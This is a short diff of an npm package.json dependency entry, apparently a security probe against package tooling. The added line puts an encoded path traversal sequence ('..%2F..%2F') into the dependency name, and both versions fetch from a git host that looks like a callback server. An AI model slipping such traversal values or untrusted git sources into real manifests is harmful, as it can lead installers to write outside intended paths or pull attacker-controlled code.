@@ -9,6 +9,6 @@
   "author": "",
   "license": "ISC",
   "dependencies": {
-      "mydep@bxss.r0l.me": "git@bxss.r0l.me:snyknpmdep.git"
+      "mydep..%2F..%2Ftest": "git@bxss.r0l.me:snyknpmdep.git"
   }
 }
